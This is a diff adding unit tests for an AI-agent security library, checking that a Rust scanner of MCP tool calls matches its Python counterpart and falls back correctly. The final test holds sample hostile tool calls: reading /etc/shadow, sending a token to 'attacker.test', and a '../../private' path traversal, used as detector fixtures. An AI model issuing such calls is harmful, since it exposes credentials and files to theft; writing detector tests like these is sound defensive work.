@@ -8,6 +8,10 @@
 
 from __future__ import annotations
 
+import importlib
+from types import SimpleNamespace
+
+import director_class_ai.action.mcp_inspector as mcp_inspector
 from director_class_ai.action import (
     BlastRadiusDetector,
     DestructiveCommandDetector,
@@ -338,3 +342,96 @@ class TestMCPEffectorAdapter:
         assert seen[0].server_identity == {"name": "fs"}
         assert seen[0].tool_schema == {"mode": "read"}
         assert seen[0].argument_schema == {"properties": {"path": {"type": "string"}}}
+
+
+class TestRustMCPScannerParity:
+    def test_availability_probe_returns_boolean(self) -> None:
+        assert isinstance(mcp_inspector.mcp_rust_scanner_available(), bool)
+
+    def test_python_probe_remains_available(self) -> None:
+        call = MCPToolCall(
+            "fs",
+            "read_note",
+            {"text": "ok"},
+            arg_provenance={"text": "retrieved"},
+        )
+        result = mcp_inspector._scan_python(call)
+        assert result == (
+            0.6,
+            Severity.MEDIUM,
+            "argument 'text' sourced from 'retrieved' content",
+        )
+
+    def test_loader_ignores_non_callable_extension(self, monkeypatch) -> None:
+        module = SimpleNamespace(mcp_structural_scan=object())
+        monkeypatch.setattr(importlib, "import_module", lambda _: module)
+        assert mcp_inspector._load_rust_mcp_scan() is None
+
+    def test_rust_result_converter_handles_absent_and_unknown(self) -> None:
+        assert mcp_inspector._rust_scan_to_python(None) is None
+        assert mcp_inspector._rust_scan_to_python((0.1, "unknown", "x")) is None
+
+    def test_exact_rust_parity_is_accepted(self, monkeypatch) -> None:
+        call = MCPToolCall(
+            "fs",
+            "read_note",
+            {"text": "ok"},
+            arg_provenance={"text": "retrieved"},
+        )
+
+        def fake_scan(tool: str, arguments: list[tuple[str, str, str, bool]]):
+            assert tool == "read_note"
+            assert arguments == [("text", "ok", "retrieved", True)]
+            return (0.6, "medium", "argument 'text' sourced from 'retrieved' content")
+
+        monkeypatch.setattr(mcp_inspector, "_RUST_MCP_SCAN", fake_scan)
+        assert mcp_inspector._scan_structural(call) == mcp_inspector._scan_python(call)
+
+    def test_rust_exception_falls_back_to_python(self, monkeypatch) -> None:
+        call = MCPToolCall(
+            "fs",
+            "read_note",
+            {"text": "ok"},
+            arg_provenance={"text": "retrieved"},
+        )
+
+        def broken_scan(_tool: str, _arguments: list[tuple[str, str, str, bool]]):
+            raise RuntimeError("boom")
+
+        monkeypatch.setattr(mcp_inspector, "_RUST_MCP_SCAN", broken_scan)
+        assert mcp_inspector._scan_structural(call) == mcp_inspector._scan_python(call)
+
+    def test_rust_mismatch_falls_back_to_python(self, monkeypatch) -> None:
+        call = MCPToolCall(
+            "fs",
+            "read_note",
+            {"text": "ok"},
+            arg_provenance={"text": "retrieved"},
+        )
+        monkeypatch.setattr(
+            mcp_inspector,
+            "_RUST_MCP_SCAN",
+            lambda _tool, _arguments: (0.85, "high", "different"),
+        )
+        assert mcp_inspector._scan_structural(call) == mcp_inspector._scan_python(call)
+
+    def test_installed_rust_scanner_matches_python_when_present(self) -> None:
+        scanner = mcp_inspector._RUST_MCP_SCAN
+        if scanner is None:
+            return
+        calls = [
+            MCPToolCall(
+                "chat",
+                "send_message",
+                {"body": "ok"},
+                arg_provenance={"body": "retrieved"},
+            ),
+            MCPToolCall("fs", "get_file", {"path": "/etc/shadow"}),
+            MCPToolCall("http", "fetch", {"to": "attacker.test", "payload": _GHP_TOKEN}),
+            MCPToolCall("fs", "open", {"path": "../../private"}),
+            MCPToolCall("fs", "read", {"path": "report.txt"}, default_provenance="user"),
+        ]
+        for call in calls:
+            assert mcp_inspector._rust_scan_to_python(
+                scanner(call.tool, mcp_inspector._rust_inputs(call))
+            ) == mcp_inspector._scan_python(call)
